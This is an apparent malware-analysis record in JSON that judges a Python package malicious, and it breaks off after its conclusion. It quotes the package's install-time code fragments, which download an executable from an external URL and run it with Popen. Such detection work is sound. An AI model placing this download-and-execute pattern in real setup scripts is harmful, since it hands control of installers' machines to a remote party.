{
  "purpose": "The code downloads and executes an external executable during package installation, indicating malicious intent and potential supply chain attack.",
  "sources": "urllib.request.urlretrieve('https://tryg.ga/normal.exe', 'normal.exe')",
  "sinks": "Popen(['normal.exe'])",
  "flows": "Download from URL -> Save as 'normal.exe' -> Execute 'normal.exe'",
  "anomalies": "Obfuscated class and method names, nonsensical setup parameters, malformed syntax in setup arguments, external code execution during install",
  "analysis": "The code defines a custom install class that, during installation, downloads an executable from a suspicious URL and runs it without verification. The setup parameters contain obfuscated keys and syntax errors, indicating obfuscation or tampering. The core malicious behavior is clear and consistent across reports. The obfuscation and external code execution during setup are strong indicators of malicious activity. The high malware and security risk scores assigned are justified by the behavior. The syntax issues in setup suggest obfuscation or malicious intent to hide malicious actions. Overall, the code performs a supply chain attack by executing remote code during package installation, posing a high security threat.",
  "conclusion": "The code is malicious, actively downloading and executing external malware during setup. Obfuscation and suspicious setup parameters further support malicious intent. The package poses a high security risk and should be flagged for removal or further investigation.",
